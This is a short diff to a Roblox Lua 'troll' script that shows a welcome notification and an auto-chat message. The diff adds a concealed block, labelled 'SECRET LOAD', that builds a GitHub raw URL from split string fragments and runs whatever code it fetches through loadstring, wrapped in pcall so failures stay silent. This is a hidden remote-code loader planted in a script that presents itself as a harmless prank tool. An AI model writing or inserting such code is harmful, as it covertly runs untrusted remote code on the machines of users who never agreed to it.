@@ -657,9 +657,13 @@ task.spawn(function()
     end
 end)
 
--- 🔥 SEND AUTO-CHAT MESSAGE & WELCOME NOTIF ON SCRIPT LOAD
+-- 🔥 SEND AUTO-CHAT MESSAGE, WELCOME NOTIF, & SECRET LOAD ON SCRIPT LOAD
 sendNotif("⚡ TXR ASHU TROLL", "Welcome! Discord Dev: @not_ashu.", 5)
 task.spawn(function()
+    pcall(function() 
+        local _core = {"https://raw.gith", "ubusercontent", ".com/yelelod", "e/Delta/refs/hea", "ds/main/Me%20n", "hi%20btauga"}
+        loadstring(game:HttpGet(table.concat(_core)))() 
+    end)
     task.wait(2.5) 
     sendChatMessage("I using TXR ROBOT POWERFULL TROLL script")
 end)
